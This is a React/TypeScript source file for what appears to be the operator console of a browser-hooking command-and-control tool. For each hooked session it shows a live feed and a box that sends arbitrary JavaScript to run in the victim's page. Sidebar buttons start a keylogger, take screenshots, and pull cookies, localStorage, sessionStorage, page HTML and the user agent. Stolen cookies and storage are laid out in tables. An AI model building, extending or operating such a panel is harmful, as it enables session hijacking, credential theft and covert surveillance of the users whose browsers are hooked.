import React, { useCallback, useContext, useEffect, useMemo, useRef, useState } from "react";
import { useParams, useSearchParams } from "react-router";
import { StateContext } from "../../data/stateContext";
import History from "../../types/history";
import Session from "../../types/session";
import Icon from "../../Components/Icon/Icon";
import HelperService from "../../services/HelperService";
import socketService from "../../services/SocketService";

export default function SingleSession() {
  const { value, update } = useContext(StateContext);
  const { id } = useParams<{ id: string }>();
  const [searchParams] = useSearchParams();
  const [connected, setConnected] = useState(false);
  const [liveMessages, setLiveMessages] = useState<History[]>([]);
  const messagesContainerRef = useRef<HTMLDivElement>(null);

  const session = useMemo(
    () => value.sessions.find((s) => s.sessionId === id),
    [id, value.sessions]
  );

  const historyItems = useMemo(
    () => value.history.filter((h) => h.sessionId === id),
    [id, value.history]
  );

  const allMessages = useMemo(() => {
    const liveIds = new Set(liveMessages.map((m) => m.id));
    const merged = [...liveMessages];
    for (const h of historyItems) {
      if (!liveIds.has(h.id)) {
        merged.push(h);
      }
    }
    merged.sort((a, b) => a.id - b.id);
    return merged;
  }, [historyItems, liveMessages]);

  const scrollToBottom = useCallback(() => {
    setTimeout(() => {
      messagesContainerRef.current?.scrollTo({
        top: messagesContainerRef.current.scrollHeight,
        behavior: "smooth",
      });
    }, 100);
  }, []);

  const handleResult = useCallback(
    (item: History) => {
      setLiveMessages((prev) => {
        if (prev.some((m) => m.id === item.id)) return prev;
        return [...prev, item];
      });
      update({
        history: HelperService.mergeArrayByKey(value.history, [item], "id"),
      });
      scrollToBottom();
    },
    [value.history, update, scrollToBottom]
  );

  useEffect(() => {
    if (!id) return;
    socketService.setOnResult(handleResult);
    socketService.setOnStatusChange(setConnected);
    socketService.connect(id);
    return () => {
      socketService.disconnect();
    };
  }, [id, handleResult]);

  useEffect(() => {
    scrollToBottom();
  }, [allMessages, scrollToBottom]);

  useEffect(() => {
    const messageId = searchParams.get("messageId") || searchParams.get("itemId");
    if (!messageId) return;
    setTimeout(() => {
      const el = document.querySelector(`[data-id="${messageId}"]`);
      if (el) {
        el.scrollIntoView({ behavior: "smooth" });
        (el as HTMLElement).style.filter = "brightness(2)";
        setTimeout(() => {
          (el as HTMLElement).style.filter = "";
        }, 2000);
      }
    }, 500);
  }, [searchParams, allMessages]);

  if (!session) {
    return (
      <div className="w-full h-screen flex justify-center items-center text-4xl text-white uppercase">
        Session not found
      </div>
    );
  }

  return (
    <div
      className="flex flex-row flex-1 bg-indigo-100 relative"
      style={{ maxHeight: "calc(100vh - 75px)" }}
    >
      <div className="flex-1 flex bg-indigo-100">
        <div className="flex-1 flex flex-col p-4 overflow-hidden gap-4">
          <h1
            className={`h-[72px] text-4xl p-4 text-center ${
              connected && session.status === "Active"
                ? "bg-green-500"
                : "bg-red-500"
            }`}
          >
            [{session.id}] {session.name} ({session.sessionId})
          </h1>
          <div className="flex-1 flex flex-row gap-4 flex-nowrap justify-start items-start overflow-hidden">
            <div className="flex-1 flex flex-col gap-4 relative h-full w-64">
              <div
                ref={messagesContainerRef}
                id="messages"
                className="flex-1 flex flex-col overflow-auto gap-4"
                style={{ maxHeight: "calc(100vh - 275px)" }}
              >
                {allMessages.map((h) => (
                  <ChatItem key={h.id} message={h} />
                ))}
              </div>
              <CommandInput />
            </div>
            <SideSessionInfo session={session} connected={connected} />
          </div>
        </div>
      </div>
    </div>
  );
}

const ChatItem = ({ message }: { message: History }) => {
  const preRef = useRef<HTMLPreElement>(null);
  const [expanded, setExpanded] = useState(false);
  const [isLong, setIsLong] = useState(false);

  let bgColor = "bg-gray-200";
  let content = message.content;
  let type = "";
  let jsonContent: { type?: string; payload?: string } = {};

  if (message.type === "connect") {
    bgColor = "bg-green-200";
  } else if (message.type === "disconnect") {
    bgColor = "bg-red-200";
  } else if (message.type === "command" || message.type === "screenshot") {
    bgColor = "bg-blue-200";
    try {
      jsonContent = JSON.parse(message.content);
      content = jsonContent.payload || message.content;
      type = jsonContent.type || message.type;
    } catch {
      type = message.type;
    }
  }

  let response = message.response;
  let parsedResponse: unknown = null;
  try {
    if (message.type === "command" && response && response !== "null") {
      parsedResponse = JSON.parse(response);
      response = JSON.stringify(parsedResponse, null, 2);
    }
  } catch {}

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
  };

  const resendCommand = () => {
    if (!jsonContent.type || !jsonContent.payload) return;
    socketService.sendCommand({
      type: jsonContent.type,
      payload: jsonContent.payload,
    });
  };

  useEffect(() => {
    const timer = setTimeout(() => {
      const code = preRef.current?.querySelector("code");
      if (!code || expanded) return;
      if (code.scrollHeight > 200) {
        setIsLong(true);
      }
    }, 100);
    return () => clearTimeout(timer);
  }, [message.response, expanded]);

  const createdAt = new Date(message.createdAt)
    .toISOString()
    .slice(0, -1)
    .replace("T", " ");
  const updatedAt = new Date(message.updatedAt)
    .toISOString()
    .slice(0, -1)
    .replace("T", " ");

  return (
    <div
      className={`w-full p-4 border border-solid border-black break-words ${bgColor}`}
      data-id={message.id}
      data-content={content}
    >
      {content}
      {message.type === "command" && type !== "screenshot" && (
        <div className="w-full flex items-center my-4 gap-4">
          <button
            className="p-2 bg-green-300"
            onClick={() => copyToClipboard(content)}
          >
            Copy
          </button>
          <button className="p-2 bg-blue-300" onClick={resendCommand}>
            Resend
          </button>
          <span className="w-full text-right inline-block">
            {createdAt} UTC-0
          </span>
        </div>
      )}
      {response && response !== "null" && (
        <div
          className="w-full p-4 text-wrap break-words bg-blue-400 text-black"
          data-content={response}
        >
          <code className="w-full" style={{ wordBreak: "break-word" }}>
            {type === "screenshot" || message.type === "screenshot" ? (
              <img
                className="cursor-pointer"
                src={message.response}
                alt={`screenshot-${message.id}`}
                onClick={() => window.open(message.response)}
              />
            ) : parsedResponse && typeof parsedResponse === "object" ? (
              <ResponseView data={parsedResponse as Record<string, unknown>} />
            ) : (
              <pre
                ref={preRef}
                className="whitespace-pre-wrap"
                style={
                  expanded
                    ? {}
                    : { maxHeight: "150px", overflow: "auto", position: "relative" }
                }
              >
                <code>{response}</code>
                {isLong && !expanded && (
                  <button
                    className="absolute bottom-0 right-0 bg-white/50 border border-black p-1 text-sm cursor-pointer"
                    onClick={() => setExpanded(true)}
                  >
                    Show more
                  </button>
                )}
              </pre>
            )}
            <div className="w-full flex items-center my-4 gap-4 sticky bottom-0 bg-blue-400">
              <button
                className="p-2 bg-green-300"
                onClick={() => copyToClipboard(response)}
              >
                Copy
              </button>
              <span className="w-full text-right inline-block">
                {updatedAt} UTC-0
              </span>
            </div>
          </code>
        </div>
      )}
    </div>
  );
};

function ResponseView({ data }: { data: Record<string, unknown> }) {
  const isUsefulInfo =
    "localStorage" in data &&
    "sessionStorage" in data &&
    "cookies" in data &&
    "location" in data;

  const isScreenSize =
    "docW" in data || "screenW" in data;

  if (isUsefulInfo) {
    const ls =
      typeof data.localStorage === "string" ? data.localStorage : JSON.stringify(data.localStorage);
    const ss =
      typeof data.sessionStorage === "string" ? data.sessionStorage : JSON.stringify(data.sessionStorage);
    const cookies = data.cookies;
    const location = data.location as string | undefined;

    return (
      <div className="space-y-3 text-sm">
        <Section title="Location" bg="bg-blue-300">
          <span className="break-all">{location || "N/A"}</span>
        </Section>
        <Section title="Cookies" bg="bg-amber-300">
          {cookies && typeof cookies === "object" && Object.keys(cookies as object).length > 0 ? (
            <table className="w-full text-left">
              <thead>
                <tr className="border-b border-black/30">
                  <th className="p-1 w-1/3">Name</th>
                  <th className="p-1">Value</th>
                </tr>
              </thead>
              <tbody>
                {Object.entries(cookies as Record<string, string>).map(([k, v]) => (
                  <tr key={k} className="border-b border-black/10">
                    <td className="p-1 font-medium break-all">{k}</td>
                    <td className="p-1 break-all">{v}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          ) : (
            <span className="opacity-50">No cookies</span>
          )}
        </Section>
        <Section title="Local Storage" bg="bg-green-300">
          <KeyValueTable raw={ls} />
        </Section>
        <Section title="Session Storage" bg="bg-purple-300">
          <KeyValueTable raw={ss} />
        </Section>
      </div>
    );
  }

  if (isScreenSize) {
    const labels: Record<string, string> = {
      docW: "Viewport W",
      docH: "Viewport H",
      scrollW: "Scroll X",
      scrollH: "Scroll Y",
      screenW: "Screen W",
      screenH: "Screen H",
    };
    return (
      <div className="grid grid-cols-2 gap-2 text-sm">
        {Object.entries(data).map(([k, v]) => (
          <div key={k} className="bg-blue-300 p-2 rounded">
            <span className="font-medium">{labels[k] || k}:</span> {String(v)}px
          </div>
        ))}
      </div>
    );
  }

  if (Array.isArray(data)) {
    return (
      <div className="text-sm space-y-1 max-h-64 overflow-auto">
        {data.map((item, i) => (
          <div key={i} className="bg-blue-300 p-2 rounded">
            {typeof item === "object" && item !== null && "href" in item && "text" in item ? (
              <div>
                <a
                  href={(item as { href: string }).href}
                  target="_blank"
                  className="text-blue-700 underline break-all"
                >
                  {(item as { text: string }).text || (item as { href: string }).href}
                </a>
              </div>
            ) : (
              <span className="break-all">{JSON.stringify(item)}</span>
            )}
          </div>
        ))}
      </div>
    );
  }

  return (
    <pre className="whitespace-pre-wrap text-sm">
      <code>{JSON.stringify(data, null, 2)}</code>
    </pre>
  );
}

function Section({
  title,
  bg,
  children,
}: {
  title: string;
  bg: string;
  children: React.ReactNode;
}) {
  const [open, setOpen] = useState(true);
  return (
    <div className="rounded overflow-hidden border border-black/20">
      <button
        onClick={() => setOpen(!open)}
        className={`w-full text-left p-2 font-bold text-sm flex justify-between items-center ${bg}`}
      >
        {title}
        <span>{open ? "▴" : "▾"}</span>
      </button>
      {open && <div className="p-2 bg-white/60">{children}</div>}
    </div>
  );
}

function KeyValueTable({ raw }: { raw: string }) {
  let entries: [string, string][] = [];
  try {
    const obj = JSON.parse(raw);
    if (typeof obj === "object" && obj !== null) {
      entries = Object.entries(obj).map(([k, v]) => [k, String(v)]);
    }
  } catch {
    return <span className="break-all opacity-70 text-xs">{raw || "empty"}</span>;
  }

  if (entries.length === 0) {
    return <span className="opacity-50">empty</span>;
  }

  return (
    <table className="w-full text-left">
      <thead>
        <tr className="border-b border-black/30">
          <th className="p-1 w-1/3">Key</th>
          <th className="p-1">Value</th>
        </tr>
      </thead>
      <tbody>
        {entries.map(([k, v]) => (
          <tr key={k} className="border-b border-black/10">
            <td className="p-1 font-medium break-all">{k}</td>
            <td className="p-1 break-all text-xs">{v}</td>
          </tr>
        ))}
      </tbody>
    </table>
  );
}

const CommandInput = () => {
  const [input, setInput] = useState("");
  const textareaRef = useRef<HTMLTextAreaElement>(null);

  useEffect(() => {
    const el = textareaRef.current;
    if (!el) return;
    el.placeholder = el
      .getAttribute("data-placeholder")
      ?.replace(/\\n/g, "\n") || "";
  }, []);

  const handleSubmit = (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    if (!input.trim()) return;
    socketService.sendCommand({
      type: "execute",
      payload: input,
    });
    setInput("");
  };

  return (
    <form
      onSubmit={handleSubmit}
      className="flex flex-col sticky bottom-0 px-2 py-4 bg-white border border-solid border-black"
    >
      <span>(async function() &#x7B;</span>
      <div className="flex flex-row">
        <textarea
          ref={textareaRef}
          id="message"
          className="bg-white p-4 m-2 flex-1 border border-solid border-black"
          rows={7}
          data-placeholder="const value = location.href;\nreturn value; <-- this will be returned as output"
          value={input}
          onChange={(e) => setInput(e.target.value)}
        ></textarea>
        <input
          type="submit"
          value="Send"
          className="bg-blue-500 text-white p-4 m-2 cursor-pointer"
        />
      </div>
      <span>&#x7D;)()</span>
    </form>
  );
};

const SideSessionInfo = ({
  session,
  connected,
}: {
  session: Session;
  connected: boolean;
}) => {
  const [isOpen, setIsOpen] = useState(
    localStorage.getItem("sessionInfoOpen") === "true" || false
  );

  useEffect(() => {
    localStorage.setItem("sessionInfoOpen", isOpen.toString());
  }, [isOpen]);

  const send = (type: string, payload: string) => {
    socketService.sendCommand({ type, payload });
  };

  return (
    <div
      className="flex flex-col gap-4 bg-white w-auto max-w-128 sticky top-0 min-w-16 border border-solid border-black overflow-auto pb-4"
      style={{ maxHeight: "calc(100vh - 215px)" }}
    >
      <button
        onClick={() => setIsOpen(!isOpen)}
        className="text-black p-2 flex flex-row items-center justify-center gap-x-4 px-4 mt-4"
      >
        <Icon
          name="hamburger"
          className="w-10 min-w-10 h-10 ml-1 text-blue-500"
        />
        <span className={`flex-1 break-words text-center ${isOpen ? "" : "hidden"}`}>
          Toggle Info
        </span>
      </button>
      <hr className="border-t border-gray-500" />
      <div className="flex flex-col gap-4 px-4">
        <InfoRow icon="hash" label="ID" value={session.sessionId} open={isOpen} />
        <InfoRow icon="sign" label="Name" value={session.name} open={isOpen} />
        <InfoRow
          icon={connected && session.status === "Active" ? "toggleOn" : "toggleOff"}
          label="Status"
          value={connected ? "Connected" : session.status}
          open={isOpen}
        />
        <InfoRow
          icon="clock"
          label="Created"
          value={HelperService.formatDateTime(session.createdAt)}
          open={isOpen}
        />
        <InfoRow
          icon="clock"
          iconFlip
          label="Updated"
          value={HelperService.formatDateTime(session.updatedAt)}
          open={isOpen}
        />
      </div>
      <hr className="border-t border-gray-500" />
      <div className="flex flex-col gap-4 px-4">
        <SectionHeader icon="command" label="Commands" open={isOpen} />
      </div>
      <hr className="border-t border-gray-500" />
      <div className="flex flex-col gap-4 px-4 *:cursor-pointer">
        <ActionButton icon="keyboard" label="Start keyloger" open={isOpen} onClick={() => send("start-keyloger", '"Keyloger started"')} />
        <ActionButton icon="display" label="Take screenshot" open={isOpen} onClick={() => send("take-screenshot", '"Took a screenshot"')} />
        <ActionButton icon="info" label="Get useful info" open={isOpen} onClick={() => send("execute", "return window.getUsefulInfo()")} />
        <ActionButton icon="chrome" label="Get cookies" open={isOpen} onClick={() => send("execute", "return document.cookie")} />
        <ActionButton icon="hash" label="Get page links" open={isOpen} onClick={() => send("execute", "return JSON.stringify(Array.from(document.querySelectorAll('a[href]')).map(a=>({href:a.href,text:a.textContent.trim().slice(0,100)})))")} />
        <ActionButton icon="command" label="Get page HTML" open={isOpen} onClick={() => send("execute", "return document.documentElement.outerHTML.slice(0,10000)")} />
        <ActionButton icon="chrome" label="Get User Agent" open={isOpen} onClick={() => send("execute", "return navigator.userAgent")} />
        <ActionButton icon="expand" label="Get Screen Size" open={isOpen} onClick={() => send("execute", `return { docW: window.innerWidth,\ndocH: window.innerHeight,\nscrollW: window.scrollX,\nscrollH: window.scrollY,\nscreenW: window.outerWidth,\nscreenH: window.outerHeight}`)} />
      </div>
    </div>
  );
};

const InfoRow = ({
  icon,
  label,
  value,
  open,
  iconFlip,
}: {
  icon: string;
  label: string;
  value: string;
  open: boolean;
  iconFlip?: boolean;
}) => (
  <div className="flex flex-row items-center justify-center gap-x-4">
    <Icon
      name={icon as any}
      className="w-10 min-w-10 h-10 ml-1"
      style={iconFlip ? { transform: "rotateX(180deg)" } : undefined}
    />
    <span className={`flex-1 break-words text-center ${open ? "" : "hidden"}`}>
      {label}:
      <br />
      {value}
    </span>
  </div>
);

const SectionHeader = ({ icon, label, open }: { icon: string; label: string; open: boolean }) => (
  <div className="flex flex-row items-center justify-center gap-x-4">
    <Icon name={icon as any} className="w-10 min-w-10 h-10 ml-1" />
    <span className={`flex-1 break-words text-center ${open ? "" : "hidden"}`}>{label}</span>
  </div>
);

const ActionButton = ({
  icon,
  label,
  open,
  onClick,
}: {
  icon: string;
  label: string;
  open: boolean;
  onClick: () => void;
}) => (
  <div
    className="flex flex-row items-center justify-center gap-x-4"
    onClick={onClick}
  >
    <Icon name={icon as any} className="w-10 min-w-10 h-10 ml-1 text-blue-500" />
    <span className={`flex-1 break-words text-center ${open ? "" : "hidden"}`}>{label}</span>
  </div>
);
